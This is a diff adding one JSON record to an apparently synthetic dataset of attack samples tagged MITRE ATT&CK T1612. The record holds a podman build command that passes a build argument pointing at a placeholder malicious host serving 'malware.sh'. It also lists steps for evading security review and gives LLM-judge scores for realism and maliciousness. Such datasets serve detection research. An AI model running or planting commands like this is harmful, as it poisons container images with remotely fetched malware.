@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1612",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "podman build -t backdoor_image --build-arg URL=http://malicious.com/malware.sh .",
+  "explanation": "Builds an image and fetches a malicious script from a remote server during the build process.",
+  "rationale_steps": [
+    "Utilize build-time arguments to fetch malicious content from external sources.",
+    "Tag the image to potentially bypass basic security reviews."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1612-d9de570a-9c550fe7",
+  "source_prompt_hash": "d9de570a",
+  "timestamp_utc": "2025-07-10T23:21:09.194530Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": true,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 4.61,
+      "command_length": 80
+    },
+    "llm_judgments": [
+      {
+        "model": "gpt-4-turbo",
+        "score": 0.865,
+        "category_fit": 0.9,
+        "attack_realism": 0.85,
+        "maliciousness": 0.8,
+        "technical_plausibility": 0.9,
+        "privilege_relevance": 0.85,
+        "reason": "The sample involves building a malicious container image on a host using 'podman' with a command that fetches a script from a malicious source, which aligns closely with the technique described in T1612 under MITRE ATT&CK.",
+        "timestamp": "2025-07-12T18:30:03.515846Z"
+      },
+      {
+        "model": "claude-3-opus-20240229",
+        "category_fit": 1.0,
+        "attack_realism": 0.9,
+        "maliciousness": 0.8,
+        "technical_plausibility": 1.0,
+        "privilege_relevance": 0.9,
+        "score": 0.93,
+        "reason": "The sample perfectly demonstrates the technique of building a malicious container image on-host using standard container build commands and malicious build arguments, matching the exact scenario described in T1612.",
+        "timestamp": "2025-07-14T04:31:54.528609Z"
+      }
+    ],
+    "llm_average_submetrics": {
+      "category_fit": 0.95,
+      "attack_realism": 0.875,
+      "maliciousness": 0.8,
+      "technical_plausibility": 0.95,
+      "privilege_relevance": 0.875
+    },
+    "llm_average_score": 0.898,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
